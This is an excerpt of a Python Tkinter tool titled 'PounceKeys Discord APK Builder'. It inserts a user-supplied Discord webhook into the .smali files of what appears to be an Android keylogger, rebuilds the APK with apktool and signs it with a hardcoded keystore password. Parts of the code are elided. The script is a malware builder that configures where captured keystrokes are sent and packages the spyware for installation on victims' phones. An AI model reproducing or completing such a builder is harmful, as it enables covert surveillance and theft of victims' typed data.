...
def replace_values():
    ...
    if os.path.exists(current_directory):
        for root, dirs, files in os.walk(current_directory):
            for file in files:
                if file.endswith(".smali"):
                    ...
                    content = content.replace("INSERT-YOUR-DISCORD-WEBHOOK-HERE", discord)
        ...
        apktool_command = f"java -jar {os.path.join(apktool_directory, 'apktool.jar')} b {os.path.join(apktool_directory, 'PounceKeys-Discord')}"
        ...
        dist_directory = os.path.join(apktool_directory, "PounceKeys-Discord", "dist")
        ...
        signing_command = "java -jar uber-apk-signer.jar -a apk/ -o ./apk/publish/ --ks key.jks --ksAlias pounce --ksPass 12345678 --ksKeyPass 12345678 --zipAlignPath zip/zipalign"
...
window = tk.Tk()
window.title("PounceKeys Discord APK Builder")
window.configure(bg="black")

# Create input fields with purple text
tk.Label(window, text="Discord:", fg="purple", bg="black").pack()
discord_entry = tk.Entry(window)
discord_entry.pack()
